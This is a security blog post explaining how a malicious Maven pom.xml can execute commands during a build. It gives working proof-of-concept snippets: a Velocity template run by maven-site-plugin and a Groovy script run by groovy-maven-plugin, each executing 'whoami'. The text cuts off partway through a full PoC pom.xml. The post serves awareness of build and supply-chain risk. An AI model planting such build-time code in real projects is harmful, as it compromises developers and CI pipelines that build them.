---
title: Abusing Maven’s pom.xml
url: https://security.humanativaspa.it/abusing-mavens-pom-xml/
source: Over Security - Cybersecurity news aggregator
date: 2023-03-02
fetch_date: 2025-10-04T08:28:03.178059
---

# Abusing Maven’s pom.xml

[![logo](https://hnsecurity.it/wp-content/uploads/2025/09/HN_Security_v2.svg)](https://hnsecurity.it/)

* [Home](https://hnsecurity.it)
* [Company](https://hnsecurity.it/company/)
* [Services](https://hnsecurity.it/services/)
  + [Red Teaming](https://hnsecurity.it/services/red-teaming/)
  + [DORA TLPT](https://hnsecurity.it/services/threat-led-penetration-test-dora/)
  + [AI Red Teaming](https://hnsecurity.it/services/ai-red-teaming/)
  + [Network Assessment](https://hnsecurity.it/services/network-assessment/)
  + [Web Assessment](https://hnsecurity.it/services/web-application-assessment/)
  + [Mobile Assessment](https://hnsecurity.it/services/mobile-application-assessment/)
  + [Mainframe Assessment](https://hnsecurity.it/services/mainframe-assessment/)
  + [Cloud Assessment](https://hnsecurity.it/services/cloud-assessment/)
  + [OT Assessment](https://hnsecurity.it/services/ot-assessment/)
  + [IoT Assessment](https://hnsecurity.it/services/iot-assessment/)
  + [Hardware Assessment](https://hnsecurity.it/services/hardware-assessment/)
  + [Security by Design](https://hnsecurity.it/services/security-by-design/)
* [Blog](https://hnsecurity.it/blog/)
* [Careers](https://hnsecurity.it/careers/)
* [Contacts](https://hnsecurity.it/contacts/)
* [![Italian](https://hnsecurity.it/wp-content/plugins/sitepress-multilingual-cms/res/flags/it.svg)](https://hnsecurity.it/it/blog/abusing-mavens-pom-xml/ "Switch to ")

Get in touch

info@hnsecurity.it

![](https://hnsecurity.it/wp-content/uploads/2025/09/MAVEN-uai-836x836.jpg)

# Abusing Maven’s pom.xml

February 27, 2023|[![Gianluca Baldi](https://hnsecurity.it/wp-content/uploads/2025/09/Baldi-sm-150x150.jpg)](https://hnsecurity.it/blog/author/gianluca-baldi/)By [Gianluca Baldi](https://hnsecurity.it/blog/author/gianluca-baldi/)

[Articles](https://hnsecurity.it/blog/category/articles/ "View all posts in Articles"), [Exploits](https://hnsecurity.it/blog/category/exploits/ "View all posts in Exploits")

**Apache Maven** is a well-known tool for software development project management. “*Based on the concept of a project object model (POM), Maven can manage a project’s build, reporting and documentation from a central piece of information”* (from Maven’s website). So, the core of a Maven project is the **pom.xml** file, which includes all the details required for the correct functioning and compilation of the project itself (for example, all the required dependencies and their version) and even more (unit tests reports, mailing list and so on). For all the details, this is the [official site](https://maven.apache.org/index.html).

For non-dev people like me, Maven and its pom.xml file just represented a convenient and fast way to build an open-source project that I pulled from GitHub without getting mad, nothing more. However, a pom.xml file can be incredibly complex and Maven can perform a lot of different tasks based on complex rules, build steps and more.

**Even executing code**.

![](https://hnsecurity.it/wp-content/uploads/2023/02/wtf-2.jpeg)

At least for me, discovering that simply running a “mvn build” command can lead to compromise made me very uncomfortable. **My bias was that compiling code is safer than running it**… but in this case, it can be worse: you can have the most trusted code in the world to compile but a malicious *pom.xml* to build your trusted code can compromise you. Also, **consider the potential impact of this behavior in a deployment pipeline context.**

I have identified 2 methods to execute code on the compiling machine (for sure there are way more – but these two do not require “exotic” plugins or any change to the code):

* **maven-site-plugin**: the 1st method uses a simple .vm (extension for Apache Velocity) file called “default-site.vm” that must be included in the same directory of the pom.xml and that is processed by the maven-site-plugin in order to create a “site” for the project.

```
[...]
<!-- plugins section of the pom.xml file  -->
<plugins>

        <plugin>

          <groupId>org.apache.maven.plugins</groupId>

          <artifactId>maven-site-plugin</artifactId>

          <version>3.12.1</version>

          <configuration>

<templateFile>${basedir}/default-site.vm</templateFile>

          </configuration>

        </plugin>

    </plugins>

[...]
```

The default-site.vm file contains the following Apache Velocity code to execute the “whoami” system command once the victim runs the “mvn site” command (the output can be seen in the ./target/site/index.html file) :

```
<!DOCTYPE html>
<html>
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
</html>
```

* **groovy-maven-plugin**: the 2nd method is more straightforward and uses the following Groovy script (<source> element) , executed by the groovy-maven-plugin once the victim runs the “mvn compile” command (for example, but it can be configured to run at any lifecycle phase) :

```
[...]
<plugins>
    <plugin>
      <groupId>org.codehaus.gmaven</groupId>
      <artifactId>groovy-maven-plugin</artifactId>
        <executions>
          <execution>
            <phase>initialize</phase>
            <goals>
              <goal>execute</goal>
            </goals>
            <configuration>
              <source>
                print "whoami".execute().text
              </source>
            </configuration>
          </execution>
      </executions>
    </plugin>
 </plugins>
[...]
```

A complete PoC of a malicious project is the following:

```
<?xml version="1.0" encoding="UTF-8"?>

<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
  <modelVersion>4.0.0</modelVersion>

  <groupId>com.mycompany.app</groupId>
  <artifactId>my-app</artifactId>
  <version>1.0-SNAPSHOT</version>

  <name>my-app</name>
  <!-- FIXME change it to the project's website -->
  <url>http://www.example.com</url>

  <properties>
    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    <maven.compiler.source>1.7</maven.compiler.source>
    <maven.compiler.target>1.7</maven.compiler.target>
  </properties>

  <dependencies>
    <dependency>
      <groupId>junit</groupId>
      <artifactId>junit</artifactId>
      <version>4.11</version>
      <scope>test</scope>
    </dependency>
  </dependencies>

  <build>
    <pluginManagement><!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) -->
      <plugins>
        <plugin>
          <artifactId>maven-clean-plugin</artifactId>
          <version>3.1.0</version>
        </plugin>
        <plugin>
          <artifactId>maven-resources-plugin</artifactId>
          <version>3.0.2</version>
        </plugin>
        <plugin>
          <artifactId>maven-compiler-plugin</artifactId>
          <version>3.8.0</version>
        </plugin>
        <plugin>
          <artifactId>maven-surefire-plugin</artifactId>
          <version>2.22.1</version>
        </plugin>
        <plugin>
          <artifactId>maven-jar-plugin</artifactId>
          <version>3.0.2</version>
        </plugin>
        <plugin>
          <artifactId>maven-install-plugin</artifactId>
          <version>2.5.2</version>
        </plugin>
        <plugin>
          <artifactId>maven-deploy-plugin</artifactId>
          <version>2.8.2</version>
        </plugin>
        <!-- site lifecycle, see https://maven.apache.org/ref/current/maven-core/lifecycles.html#site_Lifecycle -->
        <plugin>
          <artifactId>maven-site-plugin</artifactId>
          <version>3.7.1</version>
        </plugin>
        <plugin>
          <artifactId>maven-project-info-reports-plugin</artifa...